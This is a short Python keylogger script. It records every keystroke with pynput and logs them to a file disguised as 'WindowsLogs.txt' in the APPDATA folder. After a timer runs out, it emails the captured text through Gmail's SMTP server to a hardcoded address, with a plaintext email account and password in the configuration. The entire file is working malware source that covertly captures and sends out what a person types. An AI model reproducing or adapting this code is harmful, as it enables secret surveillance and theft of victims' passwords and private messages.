import logging
from pynput import keyboard
from datetime import datetime, timedelta
import smtplib
from email.message import EmailMessage
import threading
import os

# Configurations
DURATION_MINUTES = 1 
SEND_EMAIL = True     
EMAIL_ADDRESS = 'dudeprateek11@gmail.com'
EMAIL_PASSWORD = '1234'  
RECEIVER_EMAIL = 'dudeprateek11@gmail.com'

# Timing setup
start_time = datetime.now()
end_time = start_time + timedelta(minutes=DURATION_MINUTES)

# Log file path (hidden under APPDATA)
filename = os.path.join(os.getenv("APPDATA"), "WindowsLogs.txt")

# Set up logging configuration
logging.basicConfig(filename=filename,
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

# Define the function to handle key presses
def on_press(key):
    # Stop the keylogger when the time limit is reached
    if datetime.now() > end_time:
        print("[*] Time limit reached. Stopping...")
        return False

    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys like 'Shift', 'Ctrl', etc.
        logging.info(f"Special key pressed: {key}")

# Function to send the logs via email
def send_email(filename):
    # Create the email message
    msg = EmailMessage()
    msg['Subject'] = 'Keylogger Report'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECEIVER_EMAIL

    # Read the content of the log file
    with open(filename, 'r') as f:
        content = f.read()

    # Attach the content to the email body
    msg.set_content(f"Attached is the keylog report:\n\n{content}")

    try:
        # Set up the Gmail SMTP connection
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
            print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

# Function to start the keylogger
def start_keylogger():
    print(f"[*] Keylogger started. It will stop after {DURATION_MINUTES} minutes.")
    
    # Start listening for keyboard input
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # If the email flag is true, send the logs via email
    if SEND_EMAIL:
        send_email(filename)

# Run the keylogger in a separate thread so it doesn't block other tasks
if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
